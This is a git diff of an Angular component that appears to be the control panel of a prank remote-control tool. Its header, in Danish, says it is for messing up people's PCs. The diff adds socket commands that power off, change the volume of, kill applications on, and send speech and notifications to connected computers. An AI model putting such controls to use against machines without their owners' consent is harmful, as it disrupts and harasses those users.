@@ -1,12 +1,13 @@
 import { Component } from '@angular/core';
 import { Socket } from 'ngx-socket-io';
+
 @Component({
   selector: 'app-root',
   templateUrl: './app.component.html',
   styleUrls: ['./app.component.scss']
 })
 export class AppComponent {
-  title = 'Cancer site, stedet hvor du fucker folks pcer op.';
+  Header = 'Cancer site, stedet hvor du fucker folks pcer op.';
   URL = 'https://google.dk'
 
   constructor(private socket: Socket) { }
@@ -14,19 +15,31 @@ export class AppComponent {
     alert('YAAAH');
     this.socket.emit('openUrl', this.URL);
   }
-  say(){
-    this.socket.emit('say', "allaaaah");
+  say(Speach) {
+    this.socket.emit('say', Speach.value);
+    Speach.value = '';
   }
-  notification(){
-    var notificationOBJ = {
-      title: "yoyo man",
-      message: "u deed",
-      sound: true,
-      time: 5000,
-      wait: true,
-      type: "info"
-    }
-    this.socket.emit('notification',notificationOBJ )
-    
+  powerOff() {
+    this.socket.emit('powerOff');
+  }
+  changeVolume(volume) {
+    this.socket.emit('changeVolume', volume);
+  }
+  killApplication(name) {
+    console.log(name)
+    this.socket.emit('killApplication', name.value);
+    name.value = '';
+  }
+  notification(title, message, sound, time, wait, type) {
+    const notificationOBJ = {
+      title: title,
+      message: message,
+      sound:  (sound === 'true'),
+      time: time,
+      wait: (wait === 'true'),
+      type: type
+    };
+    console.log(notificationOBJ);
+    this.socket.emit('notification', notificationOBJ);
   }
 }
